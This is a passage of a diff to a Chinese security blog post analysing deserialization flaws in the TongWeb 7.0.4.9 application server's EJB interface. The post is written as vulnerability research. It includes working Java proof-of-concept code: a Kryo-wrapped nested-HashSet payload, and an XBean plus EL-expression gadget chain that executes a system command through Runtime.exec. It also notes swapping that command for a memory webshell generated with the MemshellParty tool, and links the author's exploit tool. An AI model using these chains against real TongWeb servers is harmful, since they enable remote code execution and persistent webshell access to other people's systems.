Base64.getEncoder().encodeToString(bout2.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  	</span><br><span class="line">  	<span class="comment">// 参考javachains</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">findClazz</span> <span class="operator">=</span> Object.class;  </span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">        Set&lt;Object&gt; s1 = root;  </span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i) &#123;  </span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">            t1.add(findClazz);  </span><br><span class="line">            s1.add(t1);  </span><br><span class="line">            s1.add(t2);  </span><br><span class="line">            s2.add(t1);  </span><br><span class="line">            s2.add(t2);  </span><br><span class="line">            s1 = t1;  </span><br><span class="line">            s2 = t2;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> root;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -193,13 +214,13 @@
 <h2 id="TongWeb7-0-4-9"><a href="#TongWeb7-0-4-9" class="headerlink" title="TongWeb7.0.4.9"></a>TongWeb7.0.4.9</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>7.0.4.9和7.0.4.2两个版本的入口点是在同一个地方的，但是有些地方有些细微的差异</p>
 <p>第一点是7.0.4.9中将<code>ProtocolMetaData#readExternal</code>方法被置空了，所以不在需要开头的八个字节</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773051503191-3390a153-2414-4d16-99ff-f672d06d163f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773051503191-3390a153-2414-4d16-99ff-f672d06d163f.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>第二点差异是在<code>ServerMetaData#readExternal</code>部分，原本的原生反序列化<code>readObject</code>被替换成了<code>Kryotuil#readFromByteArrayBysize</code>工具类反序列化，但是本质上还是<code>readObject</code>，因此我们在构造poc的时候，使用该工具类自带的 序列化方法<code>KryoUtil.writeToByteArray()</code> 即可（这么看来，我之前的想法通过Base64字符串传入恶意序列化工具的想法就被pass掉了）</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773051543681-4dc85350-72fe-4bc0-97e4-ad593c1972d8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773051543681-4dc85350-72fe-4bc0-97e4-ad593c1972d8.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>第三点在<code>EJBRequest#readExteral</code>方法中，在原本的基础上，多读取了两个字节，所以我们在构造的时候也就需要多添加两个字节</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773052160656-47a02a1d-7afa-4ff4-813c-2650d88a6e16.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773052160656-47a02a1d-7afa-4ff4-813c-2650d88a6e16.png" alt="TongWeb反序列化" loading="lazy"></p>
 <h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p>这里的POC我就不自己捣鼓了，大体的内容还是和上面的是相类似的（自己捣鼓了捣鼓方向就错了）</p>
 <h4 id="POC1-1"><a href="#POC1-1" class="headerlink" title="POC1"></a>POC1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        System.out.println(serialize(getObject()));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">obout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bout);  </span><br><span class="line">        obout.writeInt(<span class="number">2</span>); <span class="comment">// size  </span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">        <span class="type">byte</span>[] writedata = KryoUtil.writeToByteArray(object, classLoader, <span class="literal">false</span>);  </span><br><span class="line">        obout.writeInt(writedata.length);  </span><br><span class="line">        obout.write(writedata);  </span><br><span class="line">        obout.flush();  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        bout3.write(bout.toByteArray());  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(bout3.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">findClazz</span> <span class="operator">=</span> Object.class;  </span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">        Set&lt;Object&gt; s1 = root;  </span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i) &#123;  </span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>();  </span><br><span class="line">            t1.add(findClazz);  </span><br><span class="line">            s1.add(t1);  </span><br><span class="line">            s1.add(t2);  </span><br><span class="line">            s2.add(t1);  </span><br><span class="line">            s2.add(t2);  </span><br><span class="line">            s1 = t1;  </span><br><span class="line">            s2 = t2;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> root;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -208,16 +229,16 @@
 <h2 id="XBean-EL表达式"><a href="#XBean-EL表达式" class="headerlink" title="XBean + EL表达式"></a>XBean + EL表达式</h2><p>但是看别的师傅的文章，可以打XBean + EL表达式执行，但是TongWeb中的打该链子的时候好像是需要魔改一下的</p>
 <p>先学习一下这条链子是怎么打通的，首先比较常用的<code>BadAttributeValueExpException#readObject</code>调用任意类的<code>toString</code>方法</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041316317-6cf14342-d04e-4bb5-93fb-8e96f6852a40.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041316317-6cf14342-d04e-4bb5-93fb-8e96f6852a40.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>调用到<code>Binding#toString</code>方法，这里的链子走的是<code>getObject</code>方法</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041351147-d025cef8-9733-4cc9-bfbe-e1bb9959e9e4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041351147-d025cef8-9733-4cc9-bfbe-e1bb9959e9e4.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p><code>ContextUtil</code>类中存在一个内部类<code>ReadOnlyBinding</code>，将该类传入<code>BadAttributeValueExpException</code>，在readObject的时候即可触发<code>ReadOnlyBinding#getObject</code></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041439201-11473990-c5c7-44f2-8999-89c403de7766.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041439201-11473990-c5c7-44f2-8999-89c403de7766.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>走入<code>ContextUtil#resolve</code>，该<code>value(Reference)</code>是我们可控的，最后会走到<code>getObjectInstance</code>方法处，这里就比较熟悉了，我们在JNDI高版本利用时学过</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041481482-bfe7c3c2-df9d-4056-bffa-09edf1e96941.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773041481482-bfe7c3c2-df9d-4056-bffa-09edf1e96941.png" alt="TongWeb反序列化" loading="lazy"></p>
 <p>POC如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xbean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>,<span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;open -a Calculator&#x27;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor =</span><br><span class="line">                ReflectionFactory.getReflectionFactory().</span><br><span class="line">                        newConstructorForSerialization(WritableContext.class, Object.class.getConstructor());</span><br><span class="line"></span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">readOnlyBinding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding( <span class="string">&quot;sean&quot;</span>, ref, (WritableContext) constructor.newInstance() );</span><br><span class="line">        </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;&quot;</span>); <span class="comment">// 避免提前进入链路</span></span><br><span class="line">        setField(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, readOnlyBinding); <span class="comment">// 改回来</span></span><br><span class="line">        </span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object object , String filedName , Object value)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> clazz.getDeclaredField(filedName);</span><br><span class="line">                filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filed.set(object,value);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -226,12 +247,12 @@
 
 <p>调了半天终于成了</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773069194936-b419db5c-17d2-432c-9a0c-a60ba0768ed2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773069194936-b419db5c-17d2-432c-9a0c-a60ba0768ed2.png" alt="TongWeb反序列化" loading="lazy"></p>
 <h3 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h3><p>内存马的构造我猜大概率也是改包名即可，这里我直接使用MemshellParty的工具，生成注入内存马的EL表达式，替换POC中的EL表达式即可l</p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773070862307-6360bd36-cfce-45c0-8bb2-f9b1533e1090.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773070862307-6360bd36-cfce-45c0-8bb2-f9b1533e1090.png" alt="TongWeb反序列化" loading="lazy"></p>
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773070747272-c0cc3351-2fe1-4389-8e52-91527156af89.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1773070747272-c0cc3351-2fe1-4389-8e52-91527156af89.png" alt="TongWeb反序列化" loading="lazy"></p>
 <h2 id="TongWebEJB武器化"><a href="#TongWebEJB武器化" class="headerlink" title="TongWebEJB武器化"></a>TongWebEJB武器化</h2><p>经过一段时间后，我vibe coding了一个TongWeb反序列化的漏洞利用工具，项目地址如下：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/CurlySean/TongWebExploit">https://github.com/CurlySean/TongWebExploit</a></p>
 <p>第一次写这种漏洞利用工具，可能会存在一些问题，有问题的话大家可以提一下issue，点点star支持一下啦～</p>
@@ -252,13 +273,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2026/08/28/JSP%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>JSP免杀思路学习</strong>
       </a>
     
     
-      <a href="/2025/12/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8FTrick/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/12/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8FTrick/">
+        <span>更早一篇</span>
         <strong>EL表达式Trick</strong>
       </a>
     
@@ -272,9 +293,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
